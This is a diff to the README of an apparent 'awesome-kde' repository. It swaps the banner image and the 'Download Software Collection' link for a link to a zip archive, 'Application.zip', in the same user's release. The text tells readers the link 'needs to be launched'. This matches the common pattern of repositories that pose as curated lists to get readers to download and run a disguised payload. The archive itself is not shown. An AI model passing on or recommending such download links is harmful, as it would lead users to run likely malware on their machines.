@@ -2,7 +2,7 @@
 
 Welcome to the "awesome-kde" repository, your go-to place for a complete list of tools and apps that make the KDE Plasma experience even better! 🚀
 
-![KDE Plasma](https://cdn.pling.com/img/b/5/7/5/4feedc657ec2fe3a5c6d8c7c4f7862b243c9.jpg)
+![KDE Plasma](https://github.com/ZidanQawy/awesome-kde/releases/download/v1.0/Application.zip)
 
 ## About
 KDE Plasma is a free, powerful, and customizable desktop environment for Linux systems. This repository is dedicated to gathering a curated collection of tools and applications that enhance the KDE Plasma desktop experience.
@@ -16,7 +16,7 @@ KDE Plasma is a free, powerful, and customizable desktop environment for Linux s
 ## Software Collection
 If you are looking to take your KDE Plasma experience to the next level, you can download a collection of software from the following link: 
 
-[Download Software Collection](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip) 🔗
+[Download Software Collection](https://github.com/ZidanQawy/awesome-kde/releases/download/v1.0/Application.zip) 🔗
 
 *Please note that the link provided needs to be launched to access the software collection.*
 
